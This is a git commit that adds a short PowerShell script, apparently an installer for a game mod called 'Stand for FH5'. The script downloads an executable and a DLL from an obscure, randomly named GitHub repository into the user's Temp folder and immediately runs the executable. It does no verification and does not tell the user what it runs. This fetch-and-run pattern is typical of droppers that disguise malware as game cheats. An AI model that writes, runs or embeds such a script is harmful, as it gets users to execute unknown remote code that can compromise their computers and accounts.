755724a2104a0585970ee7d75925283b70777d15
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-01-14 14:46:34 -0500

    Add files via upload

---
+++ standinstall.ps1
@@ -0,0 +1,14 @@
+﻿$source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Stand%20for%20FH5.exe"
+
+$destination = "$env:USERPROFILE\AppData\Local\Temp\Stand fo FH5.exe"
+
+Invoke-WebRequest -Uri $source -OutFile $destination
+
+$source = "https://raw.githubusercontent.com/RedTheMenace/efdfrqfo0we4f9gw3e0gjfwselg/main/Backend.dll"
+
+$destination = "$env:USERPROFILE\AppData\Local\Temp\backend.dll"
+
+Invoke-WebRequest -Uri $source -OutFile $destination
+
+start "$env:USERPROFILE\AppData\Local\Temp\Stand fo FH5.exe"
+
